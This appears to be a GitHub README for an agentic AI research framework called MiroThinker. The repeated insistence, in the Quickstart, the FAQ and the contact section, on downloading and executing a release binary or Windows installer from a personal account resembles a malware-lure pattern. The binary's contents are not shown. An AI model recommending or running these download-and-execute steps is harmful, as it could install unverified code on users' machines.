# MiroThinker — Agentic Models for Deep Research and Tool Use
https://github.com/Vinvin17/MiroThinker/releases

[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github&style=for-the-badge)](https://github.com/Vinvin17/MiroThinker/releases)

![MiroThinker banner](https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1400&q=80)

Quick reference
- Repo: MiroThinker — open-source agentic models for deep research and complex tool use.
- Releases: Download the release asset from https://github.com/Vinvin17/MiroThinker/releases and execute the provided file.
- Support: See the Issues and Discussions tabs for usage help and feature requests.

What MiroThinker does 🤖🧠
- MiroThinker implements agentic AI models built for research workflows that require long-horizon planning, multi-tool coordination, and explainable reasoning.
- It runs agents that chain reasoning and tool calls. The agents use modular tool wrappers to access external systems like simulation engines, code execution sandboxes, web scrapers, and data pipelines.
- Use MiroThinker to prototype research agents, build reproducible tool-augmented experiments, or study emergent multi-step strategies.

Why this repo matters
- Research-grade: Designed to run complex experiments and instrument internal state for analysis.
- Tool-first: Each agent expects a tool registry. That makes it easy to integrate new instruments.
- Reproducible: The project focuses on versioned releases and archived assets for needed binaries and model checkpoints.

Core features ⚙️
- Agent orchestration: Multi-step plans, subgoal tracking, and retry logic.
- Tool adapters: Standard API for local executables, REST services, and remote kernels.
- Trace logging: Store decision traces for inspection and reproducibility.
- Checkpointed models: Save and load agent state, include replayable session logs.
- Plugin system: Add new reasoning modules without changing core code.

Architecture (high level) 🏗️
![Architecture diagram](https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=1200&q=80)

- Core Agent Loop: Receives a goal, produces a plan, calls tools, updates belief state.
- Tool Registry: Maps tool names to adapters. Adapters normalize inputs and outputs.
- Planner: Produces a sequence of subgoals using a mix of heuristic and learned policies.
- Executor: Calls tools, handles failures, logs all interactions.
- Tracer: Writes full decision traces for later analysis and visualization.

Quickstart — download and run (recommended) 🚀
- The release page contains packaged assets, example configs, and platform builds.
- You must download the release file and execute it to run the packaged binary or installer.
- Visit and download here: https://github.com/Vinvin17/MiroThinker/releases

Example quick steps (Linux/macOS)
```bash
# 1. Download the latest release asset from the Releases page
#    Example filename: MiroThinker-1.0.0-linux.tar.gz
curl -L -o MiroThinker-1.0.0-linux.tar.gz "https://github.com/Vinvin17/MiroThinker/releases/download/v1.0.0/MiroThinker-1.0.0-linux.tar.gz"

# 2. Extract
tar -xzf MiroThinker-1.0.0-linux.tar.gz
cd MiroThinker-1.0.0

# 3. Make the runner executable and run
chmod +x mirothinker
./mirothinker --config configs/example-research.yaml
```

Example quick steps (Windows)
```powershell
# Download the release installer (example name)
Invoke-WebRequest -Uri "https://github.com/Vinvin17/MiroThinker/releases/download/v1.0.0/MiroThinker-1.0.0-win.exe" -OutFile "MiroThinker-1.0.0-win.exe"

# Run the installer
Start-Process -FilePath ".\MiroThinker-1.0.0-win.exe" -Wait
```

If the packaged file name differs, pick the correct asset on the release page and download it. If you cannot find the file or the link behaves differently, check the Releases section and pick the most recent build.

Configuration basics 🧭
- configs/
  - example-research.yaml — Example pipeline for multi-step tool use.
  - local-dev.yaml — Minimal config for development and unit testing.
- Key fields in a config:
  - agent: model handler, planner type, memory policy
  - tools: list of tool names and adapter endpoints
  - logging: path for traces and debug output
  - resources: CPU/GPU limits and checkpoint paths

Sample config snippet
```yaml
agent:
  planner: hierarchical
  model_checkpoint: models/miro-v1.ckpt

tools:
  - name: code_runner
    adapter: subprocess
    command: "/usr/bin/python3 -u"

  - name: web_fetch
    adapter: http
    base_url: "http://localhost:8000"

logging:
  traces_dir: ./traces
  level: INFO
```

Running experiments & tracing 🧪
- Start agents with a named experiment label. The system creates a trace directory for each run.
- Traces include:
  - plan.json — sequence of planned steps and model logits
  - tool_calls.jsonl — chronological tool calls and results
  - state_snapshots/ — periodic snapshots of belief and memory

Example run
```bash
./mirothinker --config configs/example-research.yaml --experiment my-repro-run
```

Agents and tools: design notes
- Agents focus on explicit tool planning. They produce a plan that lists which tool to call and with what arguments.
- Tools act as single-responsibility adapters. Each adapter converts normalized input into the tool's native call. It returns a typed output for the agent to consume.
- The agent never directly manipulates external state. All external effects flow through registered tools.

Extending MiroThinker — add a new tool
1. Create an adapter class using the ToolAdapter base class.
2. Implement call(input) to normalize inputs and return a ToolResult object.
3. Register the adapter in your config under tools.
4. Add unit tests for the adapter and run the CI job.

Code snippet (Python-style pseudocode)
```python
from mirothinker.tools import ToolAdapter, ToolResult

class VectorDBAdapter(ToolAdapter):
    def __init__(self, conn_str):
        self.conn = connect(conn_str)

    def call(self, input_text, top_k=5) -> ToolResult:
        ids, scores = self.conn.search(input_text, k=top_k)
        return ToolResult(success=True, output={"ids": ids, "scores": scores})
```

Model details and checkpoints
- MiroThinker ships with research-focused checkpoints tuned for multi-step tool use.
- Checkpoint naming follows semantic versioning. Releases contain the matching model tarballs.
- The model format supports CPU inference and GPU acceleration where available.

Benchmarks and sample results
- Tasks: multi-step reasoning, tool composition, constrained action planning.
- Metrics: task success rate, average tool calls, planning depth, trace interpretability.
- Example (toy benchmark):
  - Task success: 78%
  - Avg tool calls: 4.3
  - Mean planning depth: 3.2

Visualization and analysis
- Use the built-in trace viewer to step through plans and tool calls.
- The viewer renders:
  - plan trees
  - tool call timelines
  - per-step logits and confidence
- Launch the viewer:
```bash
./mirothinker --trace-dir traces/my-repro-run --viewer
```

Security and sandboxes
- Tool calls may run code or access networks. Use sandboxed adapters for untrusted inputs.
- The release includes a minimal sandbox adapter that runs code inside a restricted container. Use it for public-facing demos.

Testing and CI
- The repo includes end-to-end tests for agents and adapters.
- Run the test suite locally:
```bash
pytest tests/
```
- Use the local-dev config for fast CI runs.

Contributing 🤝
- Follow the contribution guide in CONTRIBUTING.md.
- Open a short issue that defines the problem first. Attach failing traces if relevant.
- Create small pull requests focused on one change. Include tests and update docs.

Community and support
- Report bugs and request features via Issues.
- Start design discussions in Discussions with the "research" or "tools" tags.
- Share reproducible traces when asking for help.

License and attribution
- The project uses the MIT license. See the LICENSE file for details.
- Credit model checkpoints and external datasets used by your experiments.

FAQ (short)
- Q: Where do I get the release files?
  - A: Download them from https://github.com/Vinvin17/MiroThinker/releases and run the provided asset for your platform.
- Q: Can I run the agents locally without a GPU?
  - A: Yes. Use CPU-mode checkpoints or reduce batch sizes in the config.
- Q: How do I add a new planner?
  - A: Implement the Planner interface and register it in the config. Add tests.

References and related work
- Agentic systems literature on hierarchical planning and tool use.
- Prior open-source projects that inspired the tool adapter pattern.
- Papers on explainable planning and traceable decision systems.

Assets and media
- Banner and diagrams use public images to convey the theme of research and AI.
- For custom visualizations, use trace export formats (JSON) and render with D3 or Mermaid.

Contact and maintainers
- Maintainer: Vinvin17 (see profile on GitHub)
- For release downloads and packaged assets visit the Releases page: https://github.com/Vinvin17/MiroThinker/releases

License file included in repo.